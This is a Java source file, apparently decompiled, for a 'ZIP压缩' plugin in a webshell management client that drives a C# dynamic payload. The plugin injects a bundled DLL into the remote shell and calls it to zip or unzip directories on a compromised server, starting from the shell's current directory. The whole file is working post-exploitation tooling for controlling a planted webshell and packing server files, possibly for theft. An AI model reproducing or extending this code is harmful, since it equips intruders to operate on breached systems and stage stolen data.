package shells.plugins.cshap;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.GBC;
import core.ui.component.dialog.GOptionPane;
import java.awt.Component;
import java.awt.GridBagLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
   payloadName = "CShapDynamicPayload",
   Name = "Zip",
   DisplayName = "ZIP压缩"
)
public class CZip implements Plugin {
   private static final String CLASS_NAME = "CZip.Run";
   private ShellEntity shellEntity;
   private Payload payload;
   private final JPanel panel = new JPanel(new GridBagLayout());
   private final JLabel compressSrcDirLabel;
   private final JLabel compressDestFileLabel;
   private final JTextField compressDestFileTextField;
   private final JTextField compressSrcDirTextField;
   private final JButton zipButton;
   private final JButton unZipButton;
   private Encoding encoding;
   private boolean loadState;

   public CZip() {
      GBC gbcLCompressSrcDir = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
      GBC gbcCompressSrcDir = (new GBC(1, 0, 3, 1)).setInsets(5, 20, 0, 0);
      GBC gbcLCompressDestFileLabel = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
      GBC gbcCompressDestFile = (new GBC(1, 1, 3, 1)).setInsets(5, 20, 0, 0);
      GBC gbcZipButton = (new GBC(0, 2)).setInsets(5, -20, 0, 0);
      GBC gbcUnZipButton = (new GBC(0, 2, 5, 1)).setInsets(5, 20, 0, 0);
      this.compressSrcDirLabel = new JLabel("目标文件夹");
      this.compressDestFileLabel = new JLabel("压缩文件");
      this.zipButton = new JButton("压缩");
      this.unZipButton = new JButton("解压");
      this.compressSrcDirTextField = new JTextField(50);
      this.compressDestFileTextField = new JTextField(50);
      this.panel.add(this.compressSrcDirLabel, gbcLCompressSrcDir);
      this.panel.add(this.compressSrcDirTextField, gbcCompressSrcDir);
      this.panel.add(this.compressDestFileLabel, gbcLCompressDestFileLabel);
      this.panel.add(this.compressDestFileTextField, gbcCompressDestFile);
      this.panel.add(this.zipButton, gbcZipButton);
      this.panel.add(this.unZipButton, gbcUnZipButton);
   }

   private void load() {
      if (!this.loadState) {
         try {
            InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.dll", "CZip.Run".substring(0, "CZip.Run".indexOf("."))));
            byte[] binCode = functions.readInputStream(inputStream);
            inputStream.close();
            this.loadState = this.payload.include("CZip.Run", binCode);
            if (this.loadState) {
               Log.log("Load success");
            } else {
               Log.log("Load fail");
            }
         } catch (Exception var3) {
            Log.error((Throwable)var3);
         }
      }

   }

   private void zipButtonClick(ActionEvent actionEvent) {
      this.load();
      if (this.compressDestFileTextField.getText().trim().length() > 0 && this.compressSrcDirTextField.getText().trim().length() > 0) {
         ReqParameter reqParameter = new ReqParameter();
         reqParameter.add("compressFile", this.compressDestFileTextField.getText().trim());
         reqParameter.add("compressDir", this.compressSrcDirTextField.getText().trim());
         String resultString = this.encoding.Decoding(this.payload.evalFunc("CZip.Run", "zip", reqParameter));
         GOptionPane.showMessageDialog((Component)null, resultString, "提示", 1);
      } else {
         GOptionPane.showMessageDialog((Component)null, "请检查是否填写完整", "提示", 1);
      }

   }

   private void unZipButtonClick(ActionEvent actionEvent) {
      this.load();
      if (this.compressDestFileTextField.getText().trim().length() > 0 && this.compressSrcDirTextField.getText().trim().length() > 0) {
         ReqParameter reqParameter = new ReqParameter();
         reqParameter.add("compressFile", this.compressDestFileTextField.getText().trim());
         reqParameter.add("compressDir", this.compressSrcDirTextField.getText().trim());
         String resultString = this.encoding.Decoding(this.payload.evalFunc("CZip.Run", "unZip", reqParameter));
         GOptionPane.showMessageDialog((Component)null, resultString, "提示", 1);
      } else {
         GOptionPane.showMessageDialog((Component)null, "请检查是否填写完整", "提示", 1);
      }

   }

   public void init(ShellEntity shellEntity) {
      this.shellEntity = shellEntity;
      this.payload = this.shellEntity.getPayloadModule();
      this.encoding = Encoding.getEncoding(this.shellEntity);
      this.compressSrcDirTextField.setText(this.payload.currentDir());
      this.compressDestFileTextField.setText(this.payload.currentDir() + functions.getLastFileName(this.payload.currentDir()) + ".zip");
      automaticBindClick.bindJButtonClick(this, this);
   }

   public JPanel getView() {
      return this.panel;
   }
}
